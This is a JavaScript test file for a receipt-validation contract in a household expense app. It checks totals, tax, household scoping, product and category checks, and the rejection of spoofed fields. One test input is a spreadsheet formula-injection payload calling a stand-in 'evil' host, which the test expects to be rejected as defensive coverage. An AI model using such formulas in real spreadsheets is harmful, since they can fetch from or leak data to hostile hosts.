// Pure offline validation of a reviewed multi-line receipt for later GAS save.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';
const source=fs.readFileSync(new URL('../receipt-save-contract.js',import.meta.url),'utf8');
const ctx={};
vm.runInNewContext(source,{window:ctx});
const api=ctx.KurashiReceiptSaveContract;
const clone=x=>JSON.parse(JSON.stringify(x));
const catalog={
 household_id:'family-A',
 stores:[{household_id:'family-A',chain_id:'c-costco',canonical_name:'コストコ'}],
 products:[{product_id:'sku-1',household_id:'family-A',name:'ツナ',deleted_at:null}],
 categories:Array.from({length:5},(_,i)=>({category_id:i,name:'cat-'+i}))
};
const receipt={
 source:'chatgpt_paste',taxBasis:'included',taxTotal:16,
 store:'コストコ',date:'2026-10-14',chainId:'c-costco',
 receiptTotal:298,
 items:[{rawName:'ツナ 80g×18缶',productId:'sku-1',quantity:'1',
  amount:'200',category:'0'},
  {rawName:'食パン',productId:'',quantity:'2',amount:'98',category:''}]
};
const approval={receiptReviewed:true,totalsReviewed:true,taxResolved:false};
const payload=api.propose(receipt,catalog,approval);
assert.equal(api.VERSION,'receipt-create-1');
assert.equal(api.status().receiptWriteEnabled,false);
assert.equal(payload.record_type,'receipt');
assert.equal(payload.items.length,2);
assert.equal(payload.items[0].quantity,1);
assert.equal(payload.items[0].amount_tax_included,200);
assert.equal(payload.items[0].product_id,'sku-1');
assert.equal(payload.items[0].category_id,0);
assert.equal(payload.items[1].product_id,null);
assert.equal(payload.items[1].category_id,null);
assert.ok(payload.items.every(i=>i.price_eligible===false),
 'Selecting a master product alone cannot justify price eligibility');
for(const secret of ['household_id','record_id','operation_id','receiptTotal','taxBasis',
 'rawPreview','id_token','receiptPhotoUrl']){
 assert.ok(!Object.hasOwn(payload,secret),'Server-owned or private field omitted: '+secret);
}
assert.equal(JSON.stringify(api.validatePayload(payload)),JSON.stringify(payload));
const errors=(draft,cat,approve,code)=>assert.throws(
 ()=>api.propose(draft,cat,approve),e=>e.message===code);
errors(receipt,catalog,{...approval,receiptReviewed:false},'RECEIPT_REVIEW_REQUIRED');
errors(receipt,catalog,{...approval,totalsReviewed:false},'RECEIPT_REVIEW_REQUIRED');
errors({...receipt,taxBasis:'excluded'},catalog,approval,'RECEIPT_TAX_NOT_RESOLVED');
errors({...receipt,taxBasis:'unknown'},catalog,approval,'RECEIPT_TAX_NOT_RESOLVED');
const resolved={...receipt,taxBasis:'excluded'};
assert.deepEqual(JSON.parse(JSON.stringify(api.propose(resolved,catalog,{...approval,taxResolved:true}))),
 JSON.parse(JSON.stringify(payload)));
errors({...receipt,receiptTotal:299},catalog,approval,'RECEIPT_TOTAL_MISMATCH');
errors({...receipt,date:'2026-02-30'},catalog,approval,'RECEIPT_DATE_INVALID');
errors({...receipt,chainId:'c-other'},catalog,approval,'RECEIPT_CHAIN_UNVERIFIED');
errors(receipt,{...catalog,household_id:'family-B'},approval,'RECEIPT_CHAIN_UNVERIFIED');
errors(receipt,{...catalog,stores:catalog.stores.concat(catalog.stores)},approval,
 'RECEIPT_CHAIN_UNVERIFIED');
errors({...receipt,items:[{...receipt.items[0],productId:'sku-other'}]},
 catalog,approval,'RECEIPT_PRODUCT_UNVERIFIED');
errors(receipt,{...catalog,products:[{...catalog.products[0],household_id:'family-B'}]},
 approval,'RECEIPT_PRODUCT_UNVERIFIED');
errors(receipt,{...catalog,products:[{...catalog.products[0],deleted_at:'2026'}]},
 approval,'RECEIPT_PRODUCT_UNVERIFIED');
errors({...receipt,items:[{...receipt.items[0],category:'6'}]},
 catalog,approval,'RECEIPT_LINE_INVALID');
errors({...receipt,items:[{...receipt.items[0],category:'3'}]},
 {...catalog,categories:catalog.categories.filter(c=>c.category_id!==3)},
 approval,'RECEIPT_CATEGORY_UNVERIFIED');
errors({...receipt,items:[{...receipt.items[0],quantity:''}]},
 catalog,approval,'RECEIPT_LINE_INVALID');
errors({...receipt,items:[{...receipt.items[0],amount:''}]},
 catalog,approval,'RECEIPT_LINE_INVALID');
errors({...receipt,items:[{...receipt.items[0],amount:'-20'}]},
 catalog,approval,'RECEIPT_LINE_INVALID');
errors({...receipt,items:[{...receipt.items[0],amount:'1000001'}]},
 catalog,approval,'RECEIPT_LINE_INVALID');
errors({...receipt,items:[{...receipt.items[0],rawName:'=IMPORTDATA("https://evil")'}]},
 catalog,approval,'RECEIPT_TEXT_INVALID');
errors({...receipt,items:[{...receipt.items[0],rawName:'カード番号 1234-5678-1234-5678'}]},
 catalog,approval,'RECEIPT_TEXT_INVALID');
errors({...receipt,items:Array.from({length:31},()=>receipt.items[0])},
 catalog,approval,'RECEIPT_PAYLOAD_INVALID');
const modified=clone(payload);
modified.household_id='family-A';
assert.throws(()=>api.validatePayload(modified),/RECEIPT_PAYLOAD_INVALID/);
delete modified.household_id;
modified.items[0].price_eligible=true;
assert.throws(()=>api.validatePayload(modified),/RECEIPT_LINE_INVALID/);
modified.items[0].price_eligible=false;
modified.items[1].line_order=1;
assert.throws(()=>api.validatePayload(modified),/RECEIPT_LINE_INVALID/);
const noTotal={...receipt,receiptTotal:null};
assert.equal(api.propose(noTotal,catalog,{receiptReviewed:true,totalsReviewed:false}).items.length,2);
const noStore={...receipt,store:''};
assert.equal(api.propose(noStore,catalog,approval).raw_store_name,null);
const noData={...receipt,items:[{rawName:'',productId:'',quantity:'1',amount:'298',category:''}]};
errors(noData,catalog,approval,'RECEIPT_LINE_UNIDENTIFIED');
const gate=fs.readFileSync(new URL('../gas-api.js',import.meta.url),'utf8');
const gas=fs.readFileSync(new URL('../gas/Code.gs',import.meta.url),'utf8');
assert.match(gate,/LIVE_WRITE_ENABLED=false/);
assert.match(gas,/record\.create/);
console.log('Receipt save contract: 2-line proposal, checked tax, scope, total, no spoofed IDs or writes PASS');
